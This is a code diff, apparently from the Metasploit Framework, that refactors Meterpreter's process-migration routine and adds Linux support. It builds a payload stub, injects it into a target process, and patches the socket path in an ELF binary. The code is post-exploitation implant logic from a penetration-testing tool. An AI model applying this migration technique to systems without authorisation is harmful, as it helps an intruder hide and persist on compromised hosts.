@@ -185,6 +185,8 @@ class ClientCore < Extension
     client.send_keepalives = false
     process       = nil
     binary_suffix = nil
+    old_platform      = client.platform
+    old_binary_suffix = client.binary_suffix
 
     # Load in the stdapi extension if not allready present so we can determine the target pid architecture...
     client.core.use( "stdapi" ) if not client.ext.aliases.include?( "stdapi" )
@@ -212,7 +214,135 @@ class ClientCore < Extension
       raise RuntimeError, "Cannot migrate into current process", caller
     end
 
-    # Create a new payload stub
+    blob = generate_payload_stub(client, process)
+
+    # Build the migration request
+    request = Packet.create_request( 'core_migrate' )
+    request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
+    request.add_tlv( TLV_TYPE_MIGRATE_LEN, blob.length )
+    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, blob, false, client.capabilities[:zlib])
+    if process['arch'] == ARCH_X86_64
+      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
+    else
+      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
+    end
+
+    if client.platform =~ /linux/i
+      ep = elf_ep(blob)
+      request.add_tlv(TLV_TYPE_MIGRATE_BASE_ADDR, 0x20040000)
+      request.add_tlv(TLV_TYPE_MIGRATE_ENTRY_POINT, ep)
+      request.add_tlv(TLV_TYPE_MIGRATE_SOCKET_PATH, "/tmp/meterpreter.secret", false, client.capabilities[:zlib])
+    end
+
+    # Send the migration request (bump up the timeout to 60 seconds)
+    client.send_request( request, 60 )
+
+    if client.passive_service
+      # Sleep for 5 seconds to allow the full handoff, this prevents
+      # the original process from stealing our loadlib requests
+      ::IO.select(nil, nil, nil, 5.0)
+    else
+      # Prevent new commands from being sent while we finish migrating
+      client.comm_mutex.synchronize do
+        # Disable the socket request monitor
+        client.monitor_stop
+
+        ###
+        # Now communicating with the new process
+        ###
+
+        # If renegotiation takes longer than a minute, it's a pretty
+        # good bet that migration failed and the remote side is hung.
+        # Since we have the comm_mutex here, we *must* release it to
+        # keep from hanging the packet dispatcher thread, which results
+        # in blocking the entire process.
+        begin
+          Timeout.timeout(60) do
+            # Renegotiate SSL over this socket
+            client.swap_sock_ssl_to_plain()
+            client.swap_sock_plain_to_ssl()
+          end
+        rescue TimeoutError
+          client.alive = false
+          return false
+        end
+
+        # Restart the socket monitor
+        client.monitor_socket
+
+      end
+    end
+
+    # Update the meterpreter platform/suffix for loading extensions as we may
+    # have changed target architecture
+    # sf: this is kinda hacky but it works. As ruby doesnt let you un-include a
+    # module this is the simplest solution I could think of. If the platform
+    # specific modules Meterpreter_x64_Win/Meterpreter_x86_Win change
+    # significantly we will need a better way to do this.
+
+    case client.platform
+    when /win/i
+      if process['arch'] == ARCH_X86_64
+        client.platform      = 'x64/win64'
+        client.binary_suffix = 'x64.dll'
+      else
+        client.platform      = 'x86/win32'
+        client.binary_suffix = 'x86.dll'
+      end
+    when /linux/i
+      client.platform        = 'x86/linux'
+      client.binary_suffix   = 'lso'
+    else
+      client.platform        = old_platform
+      client.binary_suffix   = old_binary_suffix
+    end
+
+    # Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
+    client.ext.aliases.keys.each { |e|
+      client.core.use(e)
+    }
+
+    # Restore session keep-alives
+    client.send_keepalives = keepalive
+
+    return true
+  end
+
+  #
+  # Shuts the session down
+  #
+  def shutdown
+    request  = Packet.create_request('core_shutdown')
+
+    # If this is a standard TCP session, send and return
+    if not client.passive_service
+      self.client.send_packet(request)
+    else
+    # If this is a HTTP/HTTPS session we need to wait a few seconds
+    # otherwise the session may not receive the command before we
+    # kill the handler. This could be improved by the server side
+    # sending a reply to shutdown first.
+      self.client.send_packet_wait_response(request, 10)
+    end
+    true
+  end
+
+  private
+
+  def generate_payload_stub(client, process)
+    case client.platform
+    when /win/i
+      blob = generate_windows_stub(client, process)
+    when /linux/i
+      blob = generate_linux_stub("/tmp/meterpreter.secret")
+    else
+      raise RuntimeError, "Unsupported platform '#{client.platform}'"
+    end
+
+    blob
+  end
+
+  def generate_windows_stub(client, process)
     c = Class.new( ::Msf::Payload )
     c.include( ::Msf::Payload::Stager )
 
@@ -257,95 +387,27 @@ class ClientCore < Extension
 
     end
 
-    # Build the migration request
-    request = Packet.create_request( 'core_migrate' )
-    request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
-    request.add_tlv( TLV_TYPE_MIGRATE_LEN, blob.length )
-    request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, blob, false, client.capabilities[:zlib])
-    if process['arch'] == ARCH_X86_64
-      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
-    else
-      request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
-    end
-
-    # Send the migration request (bump up the timeout to 60 seconds)
-    client.send_request( request, 60 )
-
-    if client.passive_service
-      # Sleep for 5 seconds to allow the full handoff, this prevents
-      # the original process from stealing our loadlib requests
-      ::IO.select(nil, nil, nil, 5.0)
-    else
-      # Prevent new commands from being sent while we finish migrating
-      client.comm_mutex.synchronize do
-        # Disable the socket request monitor
-        client.monitor_stop
-
-        ###
-        # Now communicating with the new process
-        ###
-
-        # If renegotiation takes longer than a minute, it's a pretty
-        # good bet that migration failed and the remote side is hung.
-        # Since we have the comm_mutex here, we *must* release it to
-        # keep from hanging the packet dispatcher thread, which results
-        # in blocking the entire process.
-        begin
-          Timeout.timeout(60) do
-            # Renegotiate SSL over this socket
-            client.swap_sock_ssl_to_plain()
-            client.swap_sock_plain_to_ssl()
-          end
-        rescue TimeoutError
-          client.alive = false
-          return false
-        end
-
-        # Restart the socket monitor
-        client.monitor_socket
-
-      end
-    end
-
-    # Update the meterpreter platform/suffix for loading extensions as we may have changed target architecture
-    # sf: this is kinda hacky but it works. As ruby doesnt let you un-include a module this is the simplest solution I could think of.
-    # If the platform specific modules Meterpreter_x64_Win/Meterpreter_x86_Win change significantly we will need a better way to do this.
-    if process['arch'] == ARCH_X86_64
-      client.platform      = 'x64/win64'
-      client.binary_suffix = 'x64.dll'
-    else
-      client.platform      = 'x86/win32'
-      client.binary_suffix = 'x86.dll'
-    end
-
-    # Load all the extensions that were loaded in the previous instance (using the correct platform/binary_suffix)
-    client.ext.aliases.keys.each { |e|
-      client.core.use(e)
-    }
-
-    # Restore session keep-alives
-    client.send_keepalives = keepalive
-
-    return true
+    blob
   end
 
-  #
-  # Shuts the session down
-  #
-  def shutdown
-    request  = Packet.create_request('core_shutdown')
+  def generate_linux_stub(socket_path)
+    file = ::File.join(Msf::Config.data_directory, "meterpreter", "msflinker_linux_x86.bin")
+    blob = ::File.open(file, "rb") {|f|
+      f.read(f.stat.size)
+    }
 
-    # If this is a standard TCP session, send and return
-    if not client.passive_service
-      self.client.send_packet(request)
-    else
-    # If this is a HTTP/HTTPS session we need to wait a few seconds
-    # otherwise the session may not receive the command before we
-    # kill the handler. This could be improved by the server side
-    # sending a reply to shutdown first.
-      self.client.send_packet_wait_response(request, 10)
+    pos = blob.index("/tmp/meterpreter.sock")
+    unless pos.nil?
+      blob[pos, socket_path.length + 1] = socket_path + "\x00"
     end
-    true
+
+    blob
+  end
+
+  def elf_ep(payload)
+    elf = Rex::ElfParsey::Elf.new( Rex::ImageSource::Memory.new( payload ) )
+    ep = elf.elf_header.e_entry
+    return ep
   end
 
 end
